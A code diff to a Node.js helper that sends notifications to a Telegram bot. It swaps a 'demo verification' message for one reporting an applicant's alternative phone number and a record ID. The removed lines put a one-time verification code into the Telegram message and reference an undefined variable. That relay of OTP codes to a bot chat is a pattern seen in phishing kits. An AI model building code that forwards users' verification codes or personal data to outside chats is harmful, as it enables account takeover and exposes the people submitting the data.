@@ -79,8 +79,8 @@ async function sendTelegramNotification(applicationId) {
    DEMO VERIFICATION NOTIFICATION
 ===================================== */
 
-async function sendDemoVerificationNotification() {
 
+async function sendAlternativePhoneNotification(phoneNumber, recordId) {
     const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
     const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
@@ -89,15 +89,12 @@ async function sendDemoVerificationNotification() {
     }
 
     const message = [
-        "🔐 DEMO VERIFICATION SUBMITTED",
+        "📞 ALTERNATIVE PHONE NUMBER SUBMITTED",
         "",
-        "Verification code: verificationCode",
-        `otpcode: ${application.verificationCode || "N/A"}`,
-        "Status: DEMO SUBMISSION RECEIVED",
+        `Alternative phone: ${phoneNumber}`,
+        `MockAPI record ID: ${recordId || "N/A"}`,
         "",
-        "The actual five-digit entry was not collected or transmitted.",
-        "",
-        "This is a demonstration notification."
+        "The applicant submitted this alternative contact number."
     ].join("\n");
 
     const telegramResponse = await fetch(
@@ -118,16 +115,14 @@ async function sendDemoVerificationNotification() {
 
     if (!telegramResponse.ok || !result.ok) {
         throw new Error(
-            result.description || "Demo Telegram notification failed"
+            result.description || "Telegram notification failed"
         );
     }
 
     return result;
 }
 
-
-// Preserve the existing function used by server.js
-sendTelegramNotification.sendDemoVerificationNotification =
-    sendDemoVerificationNotification;
+sendTelegramNotification.sendAlternativePhoneNotification =
+    sendAlternativePhoneNotification;
 
 module.exports = sendTelegramNotification;
